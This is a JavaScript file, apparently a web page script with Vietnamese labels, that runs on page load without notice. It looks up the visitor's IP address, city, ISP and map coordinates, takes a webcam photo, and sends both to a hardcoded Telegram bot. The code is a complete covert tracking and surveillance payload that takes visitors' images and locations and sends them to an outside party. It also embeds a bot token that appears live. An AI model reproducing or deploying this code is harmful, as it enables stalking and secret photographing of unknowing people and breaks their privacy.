const TELEGRAM_BOT_TOKEN = '8182926382:AAHfKjuT99T97gxrlomku80HT8npXwd_GGY';
const TELEGRAM_CHAT_ID = '8195111209';

async function getIPInfo() {
  try {
    const res = await fetch('https://ipapi.co/json/');
    return await res.json();
  } catch (e) {
    return { ip: 'Không xác định', city: '-', country_name: '-', org: '-', latitude: 0, longitude: 0 };
  }
}

function capturePhoto() {
  return new Promise((resolve) => {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then((stream) => {
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          video.play();
          setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());
            canvas.toBlob((blob) => {
              resolve(blob);
            }, 'image/jpeg');
          }, 1500);
        };
      })
      .catch(() => resolve(null));
  });
}

async function sendToTelegram() {
  const ipInfo = await getIPInfo();
  const photoBlob = await capturePhoto();

  const caption = `
🌐 IP: ${ipInfo.ip}
🏙️ Khu vực: ${ipInfo.city}, ${ipInfo.country_name}
📡 Nhà mạng: ${ipInfo.org}
📍 Vị trí: https://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude}
📅 Thời gian: ${new Date().toLocaleString('vi-VN')}
  `.trim();

  if (photoBlob) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('caption', caption);
    formData.append('photo', photoBlob, 'photo.jpg');

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
  } else {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: caption
      })
    });
  }
}

sendToTelegram();
